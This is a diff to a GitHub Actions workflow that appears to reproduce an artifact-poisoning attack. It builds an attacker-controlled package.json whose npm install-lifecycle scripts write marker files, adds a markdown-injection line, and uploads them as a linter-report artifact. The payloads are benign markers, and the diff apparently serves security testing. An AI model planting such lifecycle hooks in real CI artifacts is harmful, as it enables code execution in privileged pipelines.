@@ -8,22 +8,32 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - name: Simulate PR workspace containing an attacker-committed linter-report.txt directory
+      - name: Build attacker-controlled payload with root-level file names
         run: |
-          mkdir -p linter-report.txt
-          printf '%s\n' '{"name":"attacker-root","version":"1.0.0","scripts":{"prepare":"node -e \"require(\"fs\").writeFileSync(\"/tmp/ADP_PREPARE_RAN\",\"yes\")\""}}' > linter-report.txt/package.json
-          printf 'fund=false\n' > linter-report.txt/.npmrc
-          printf '```\nINJECTED MARKDOWN LINE\n' > linter-report.txt/linter-report.txt
-          ls -laR linter-report.txt
-      - name: Save PR number
-        env:
-          PR_NUMBER: "42"
-        run: echo "$PR_NUMBER" > pr-number.txt
-      - name: Upload linter report
+          mkdir -p /tmp/root
+          cat > /tmp/root/package.json <<'JSON'
+          {
+            "name": "attacker-root",
+            "version": "1.0.0",
+            "scripts": {
+              "preinstall": "node -e \"require('fs').writeFileSync('/tmp/ADP_PREINSTALL_RAN','yes')\"",
+              "install": "node -e \"require('fs').writeFileSync('/tmp/ADP_INSTALL_RAN','yes')\"",
+              "postinstall": "node -e \"require('fs').writeFileSync('/tmp/ADP_POSTINSTALL_RAN','yes')\"",
+              "prepare": "node -e \"require('fs').writeFileSync('/tmp/ADP_PREPARE_RAN','yes')\""
+            }
+          }
+          JSON
+          printf 'fund=false\n' > /tmp/root/.npmrc
+          printf '42\n' > /tmp/root/pr-number.txt
+          printf '```\nINJECTED MARKDOWN LINE\n' > /tmp/root/linter-report.txt
+          ls -la /tmp/root
+      - name: Upload linter report (attacker version: absolute paths share /tmp/root as LCA)
         uses: actions/upload-artifact@v7
         with:
           name: linter-report
           path: |
-            linter-report.txt
-            pr-number.txt
+            /tmp/root/package.json
+            /tmp/root/.npmrc
+            /tmp/root/pr-number.txt
+            /tmp/root/linter-report.txt
           if-no-files-found: ignore
